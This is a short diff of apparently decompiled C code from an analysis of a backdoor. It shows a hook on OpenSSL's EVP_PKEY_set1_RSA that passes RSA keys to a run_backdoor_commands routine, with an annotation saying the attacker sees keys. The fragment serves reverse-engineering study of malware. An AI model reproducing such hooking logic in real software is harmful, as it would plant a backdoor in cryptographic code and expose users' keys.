@@ -23,6 +23,7 @@ int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)
      (orig_EVP_PKEY_set1_RSA = global_ctx->imported_funcs->EVP_PKEY_set1_RSA_orig,
      orig_EVP_PKEY_set1_RSA != (pfn_EVP_PKEY_set1_RSA_t)0x0)) {
     if (key != (RSA *)0x0) {
+      do_orig_flag = TRUE;
       // AutoDoc: Every EVP install pumps the RSA handle through run_backdoor_commands so the attacker sees keys even when decrypt never executes.
       run_backdoor_commands(key,global_ctx,&do_orig_flag);
     }
